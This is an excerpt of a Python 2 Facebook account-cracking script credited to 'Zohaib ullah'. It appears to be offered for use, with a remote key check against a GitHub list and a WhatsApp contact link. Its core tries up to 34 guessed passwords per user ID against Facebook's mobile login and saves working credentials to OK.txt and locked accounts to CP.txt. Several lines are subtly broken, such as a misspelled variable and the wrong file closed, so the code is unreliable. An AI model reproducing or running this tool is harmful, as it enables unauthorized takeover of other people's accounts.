...
logo ="""
         ...
         \x1b[1;97m   ######   ######  ######## \033[1;0m
\x1b[1;97m------------------------\x1b[1;97m------------------------×
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          Zohaib ullah
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m          zohaib ullah
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m           davik605
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/davilk605/zohaib4/main/hacking.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923134445926')
        reg()
	...
	def main(arg):
		...
		try:
			...
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
				...
				if 'checkpoint' in sp:
					print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
					...
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
						...
						if 'checkpoint' in sp:
							print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
							...
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
								...
								if 'checkpoint' in sp:
									print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
									...
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
										...
										if 'checkpoint' in sp:
											print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
											...
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
												...
												if 'checkpoint' in sp:
													print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
													...
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
														...
														if 'checkpoint' in sp:
															print(' \033[1;91m [ZOHAIB-CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
															...
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
																...
																if 'checkpoint' in sp:
																	print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																	...
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																		...
																		if 'checkpoint' in sp:
																			print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																			...
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('OK.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																				...
																				if 'checkpoint' in sp:
																					print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('CP.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																					...
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('OK.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																						...
																						if 'checkpoint' in sp:
																							print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('CP.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																							...
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('OK.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																								...
																								if 'checkpoint' in sp:
																									print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('CP.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																									...
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;91m [ZOHAIB-OK] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('OK.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																										...
																										if 'checkpoint' in sp:
																											print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('CP.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																											...
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('OK.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																												...
																												if 'checkpoint' in sp:
																													print(' \033[1;91m [ZOHAIB-CP] '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('CP.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																													...
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('OK.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																														...
																														if 'checkpoint' in sp:
																															print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('CP.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																															...
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;91m [ZOHAIB-OK] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('OK.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																																...
																																if 'checkpoint' in sp:
																																	print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('CP.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																	...
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('OK.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																		...
																																		if 'checkpoint' in sp:
																																			print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('CP.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																			...
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('OK.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																				...
																																				if 'checkpoint' in sp:
																																					print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('CP.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																					...
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;91m [ZOHAIB-OK] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('OK.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																						...
																																						if 'checkpoint' in sp:
																																							print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('CP.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																							...
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('OK.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																								...
																																								if 'checkpoint' in sp:
																																									print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('CP.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																									...
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('OK.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																										...
																																										if 'checkpoint' in sp:
																																											print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('CP.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
																																											...
																																											sp = data.content
																																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																												print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps21+'\033[0;97m')
																																												ok = open('OK.txt', 'a')
																																												ok.write(uid+'|'+ps21+'\n')
																																												ok.close()
																																												oks.append(uid+ps21)
																																												...
																																												if 'checkpoint' in sp:
																																													print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps21+'\033[0;97m')
																																													cp = open('CP.txt', 'a')
																																													cp.write(uid+'|'+ps21+'\n')
																																													cp.close()
																																													cps.append(uid+ps21)
																																													...
																																													sp = data.content
																																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																														print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps22+'\033[0;97m')
																																														ok = open('OK.txt', 'a')
																																														ok.write(uid+'|'+ps22+'\n')
																																														ok.close()
																																														oks.append(uid+ps22)
																																														...
																																														if 'checkpoint' in sp:
																																															print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps22+'\033[0;97m')
																																															cp = open('CP.txt', 'a')
																																															cp.write(uid+'|'+ps22+'\n')
																																															cp.close()
																																															cps.append(uid+ps22)
																																															...
																																															sp = data.content
																																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps23+'\033[0;97m')
																																																ok = open('OK.txt', 'a')
																																																ok.write(uid+'|'+ps23+'\n')
																																																ok.close()
																																																oks.append(uid+ps23)
																																																...
																																																if 'checkpoint' in sp:
																																																	print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps23+'\033[0;97m')
																																																	cp = open('CP.txt', 'a')
																																																	cp.write(uid+'|'+ps23+'\n')
																																																	cp.close()
																																																	cps.append(uid+ps23)
																																																	...
																																																	sp = data.content
																																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																		print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps24+'\033[0;97m')
																																																		ok = open('OK.txt', 'a')
																																																		ok.write(uid+'|'+ps24+'\n')
																																																		ok.close()
																																																		oks.append(uid+ps24)
																																																		...
																																																		if 'checkpoint' in sp:
																																																			print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps24+'\033[0;97m')
																																																			cp = open('CP.txt', 'a')
																																																			cp.write(uid+'|'+ps24+'\n')
																																																			cp.close()
																																																			cps.append(uid+ps24)
																																																			...
																																																			sp = data.content
																																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																				print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps25+'\033[0;97m')
																																																				ok = open('OK.txt', 'a')
																																																				ok.write(uid+'|'+ps25+'\n')
																																																				ok.close()
																																																				oks.append(uid+ps25)
																																																				...
																																																				if 'checkpoint' in sp:
																																																					print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps25+'\033[0;97m')
																																																					cp = open('CP.txt', 'a')
																																																					cp.write(uid+'|'+ps25+'\n')
																																																					cp.close()
																																																					cps.append(uid+ps25)
																																																					...
																																																					sp = data.content
																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																						print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps26+'\033[0;97m')
																																																						ok = open('OK.txt', 'a')
																																																						ok.write(uid+'|'+ps26+'\n')
																																																						ok.close()
																																																						oks.append(uid+ps26)
																																																						...
																																																						if 'checkpoint' in sp:
																																																							print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps26+'\033[0;97m')
																																																							cp = open('CP.txt', 'a')
																																																							cp.write(uid+'|'+ps26+'\n')
																																																							cp.close()
																																																							cps.append(uid+ps26)
																																																							...
																																																							sp = data.content
																																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																								print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps27+'\033[0;97m')
																																																								ok = open('OK.txt', 'a')
																																																								ok.write(uid+'|'+ps27+'\n')
																																																								ok.close()
																																																								oks.append(uid+ps27)
																																																								...
																																																								if 'checkpoint' in sp:
																																																									print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps27+'\033[0;97m')
																																																									cp = open('CP.txt', 'a')
																																																									cp.write(uid+'|'+ps27+'\n')
																																																									cp.close()
																																																									cps.append(uid+ps27)
																																																									...
																																																									sp = data.content
																																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																										print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps28+'\033[0;97m')
																																																										ok = open('OK.txt', 'a')
																																																										ok.write(uid+'|'+ps28+'\n')
																																																										ok.close()
																																																										oks.append(uid+ps28)
																																																										...
																																																										if 'checkpoint' in sp:
																																																											print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps28+'\033[0;97m')
																																																											cp = open('CP.txt', 'a')
																																																											cp.write(uid+'|'+ps28+'\n')
																																																											cp.close()
																																																											cps.append(uid+ps28)
																																																											...
																																																											sp = data.content
																																																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																												print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps29+'\033[0;97m')
																																																												ok = open('OK.txt', 'a')
																																																												ok.write(uid+'|'+pz29+'\n')
																																																												ok.close()
																																																												oks.append(uid+ps29)
																																																												...
																																																												if 'checkpoint' in sp:
																																																													print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps29+'\033[0;97m')
																																																													cp = open('CP.txt', 'a')
																																																													cp.write(uid+'|'+ps29+'\n')
																																																													ok.close()
																																																													cps.append(uid+ps29)
																																																													...
																																																													sp = data.content
																																																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																														print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps30+'\033[0;97m')
																																																														ok = open('OK.txt', 'a')
																																																														ok.write(uid+'|'+ps30+'\n')
																																																														ok.close()
																																																														oks.append(uid+ps30)
																																																														...
																																																														if 'checkpoint' in sp:
																																																															print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps30+'\033[0;97m')
																																																															cp = open('CP.txt', 'a')
																																																															cp.write(uid+'|'+ps30+'\n')
																																																															cp.close()
																																																															cps.append(uid+ps30)
																																																															...
																																																															sp = data.content
																																																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps31+'\033[0;97m')
																																																																ok = open('OK.txt', 'a')
																																																																ok.write(uid+'|'+ps31+'\n')
																																																																ok.close()
																																																																oks.append(uid+ps31)
																																																																...
																																																																if 'checkpoint' in sp:
																																																																	print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps31+'\033[0;97m')
																																																																	cp = open('CP.txt', 'a')
																																																																	cp.write(uid+'|'+ps31+'\n')
																																																																	ok.close()
																																																																	cps.append(uid+ps31)
																																																																	...
																																																																	sp = data.content
																																																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																		print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps32+'\033[0;97m')
																																																																		ok = open('OK.txt', 'a')
																																																																		ok.write(uid+'|'+ps32+'\n')
																																																																		ok.close()
																																																																		cps.append(uid+ps32)
																																																																		...
																																																																		if 'checkpoint' in sp:
																																																																			print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps32+'\033[0;97m')
																																																																			cp = open('CP.txt', 'a')
																																																																			cp.write(uid+'|'+ps32+'\n')
																																																																			ok.close()
																																																																			cps.append(uid+ps32)
																																																																			...
																																																																			sp = data.content
																																																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																				print(' \x1b[1;92m [ZOHAIB-CP] '+uid+' | '+ps33+'\033[0;97m')
																																																																				ok = open('OK.txt', 'a')
																																																																				ok.write(uid+'|'+ps33+'\n')
																																																																				ok.close()
																																																																				oks.append(uid+ps33)
																																																																				...
																																																																				if 'checkpoint' in sp:
																																																																					print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps33+'\033[0;97m')
																																																																					cp = open('CP.txt', 'a')
																																																																					cp.write(uid+'|'+ps33+'\n')
																																																																					cp.close()
																																																																					cps.append(uid+ps33)
																																																																					...
																																																																					sp = data.content
																																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																						print(' \x1b[1;92m [ZOHAIB-OK] '+uid+' | '+ps34+'\033[0;97m')
																																																																						ok = open('OK.txt', 'a')
																																																																						ok.write(uid+'|'+ps34+'\n')
																																																																						ok.close()
																																																																						oks.append(uid+ps34)
																																																																						...
																																																																						if 'checkpoint' in sp:
																																																																							print(' \x1b[1;91m [ZOHAIB-CP] '+uid+' | '+ps34+'\033[0;97m')
																																																																							cp = open('CP.txt', 'a')
																																																																							cp.write(uid+'|'+ps34+'\n')
																																																																							cp.close()
																																																																							cps.append(uid+ps34)
...
def choice_select():
	...
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m-----------------------------------------------------")
	raw_input("\x1b[1;91m[!]\x1b[1;97mPress enter to back FB Menu ")
	menu()
